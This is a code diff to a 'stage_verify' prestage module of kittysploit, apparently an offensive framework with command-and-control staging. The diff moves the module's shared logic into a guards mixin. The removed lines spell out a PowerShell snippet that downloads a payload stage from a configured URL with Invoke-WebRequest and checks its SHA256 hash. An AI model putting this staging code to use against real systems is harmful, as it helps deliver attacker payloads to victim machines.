@@ -4,9 +4,10 @@
 from typing import Any, Dict
 
 from kittysploit import *
+from lib.c2.prestage_guards import Prestage_guards
 
 
-class Module(Prestage):
+class Module(Prestage, Prestage_guards):
     PRESTAGE_ID = "stage_verify"
 
     __info__ = {
@@ -25,25 +26,14 @@ class Module(Prestage):
 
     def generate_powershell(self, context: Dict[str, Any] = None) -> str:
         ctx = dict(context or {})
-        stage_url = str(ctx.get("prestage_stage_url") or getattr(getattr(self, "stage_url", None), "value", "") or "").replace("'", "''")
-        stage_sha256 = str(ctx.get("prestage_stage_sha256") or getattr(getattr(self, "stage_sha256", None), "value", "") or "").lower()
-        if not stage_url and not stage_sha256:
-            return "# stage_verify: no stage_url/sha256 configured"
-        return f"""
-$ErrorActionPreference='Stop'
-try {{
-  $bytes=$null
-  if('{stage_url}'){{
-    if($global:_kitty_stage_cache){{ $bytes=$global:_kitty_stage_cache.fetch('{stage_url}','{stage_sha256}') }}
-    else {{ $bytes=(Invoke-WebRequest -Uri '{stage_url}' -UseBasicParsing -TimeoutSec 30).Content }}
-  }}
-  if('{stage_sha256}'){{
-    $sha=[System.Security.Cryptography.SHA256]::Create()
-    $digest=([BitConverter]::ToString($sha.ComputeHash([byte[]]$bytes))).Replace('-','').ToLower()
-    if($digest -ne '{stage_sha256}'){{ throw 'stage sha256 mismatch' }}
-  }}
-}} catch {{
-  try {{ _KittyTelemetryRecord 'stage_verify' 'failed' $_.Exception.Message }} catch {{}}
-  throw
-}}
-""".strip()
+        stage_url = str(
+            ctx.get("prestage_stage_url")
+            or getattr(getattr(self, "stage_url", None), "value", "")
+            or ""
+        ).strip()
+        stage_sha256 = str(
+            ctx.get("prestage_stage_sha256")
+            or getattr(getattr(self, "stage_sha256", None), "value", "")
+            or ""
+        ).strip()
+        return self.build_stage_verify_powershell(stage_url=stage_url, stage_sha256=stage_sha256)
